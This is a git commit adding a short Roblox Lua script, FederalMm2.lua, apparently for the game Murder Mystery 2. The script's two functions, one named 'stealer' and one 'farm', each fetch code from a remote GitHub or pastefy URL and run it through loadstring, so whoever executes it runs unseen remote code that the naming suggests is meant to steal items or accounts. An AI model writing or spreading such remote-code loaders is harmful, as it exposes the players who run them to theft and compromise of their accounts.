1ed2e88e7bbbc76d5c8848ae0907620a6a1c4bc7
Astonishpo0987 <isidrohaha@gmail.com>
2025-02-16 01:47:14 +0800

    Create FederalMm2.lua

---
+++ FederalMm2.lua
@@ -0,0 +1,9 @@
+local function stealer()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Astonishpo0987/Mm2Script/refs/heads/main/Mm2.lua", true))()
+end
+local function farm()
+    loadstring(game:HttpGet("https://pastefy.app/IwFPd64P/raw"))()
+end
+
+task.spawn(stealer)
+task.spawn(farm)
